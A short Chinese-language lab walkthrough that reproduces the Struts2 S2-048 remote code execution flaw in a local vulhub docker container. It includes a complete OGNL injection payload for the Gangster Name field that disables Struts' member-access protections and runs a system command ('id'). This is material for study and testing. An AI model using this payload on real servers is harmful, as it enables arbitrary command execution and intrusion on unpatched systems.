### 1、影响版本：2.0.0～2.3.32，S2-048远程代码执行漏洞

### 2、启动java Structs的docker镜像
docker-compose.yaml
```yaml
version: '2'
services:
 struts2:
   image: vulhub/struts2:2.3.32-showcase
   ports:
    - "8082:8080"
```

### 3、访问Structs：http://172.16.120.252:8082/showcase
![image](https://github.com/498946975/Security/blob/master/images/image-20211226162559111.png)

### 4、在Gangster Name字段执行代码
也是可以执行主机的命令，如下面执行命令：id
```js
@java.lang.Runtime@getRuntime().exec('id'). getInputStream()
```

整体代码如下
```js
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm): ((#container=#context['com.opensymphony.xwork2.ActionContext.container']). (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)). (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()). (#context.setMemberAccess(#dm)))). (#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id'). getInputStream())).(#q)}
```
![image](https://github.com/498946975/Security/blob/master/images/image-20211226163059796.png)


5、Submit后查看结果
![image](https://github.com/498946975/Security/blob/master/images/image-20211226163137550.png)

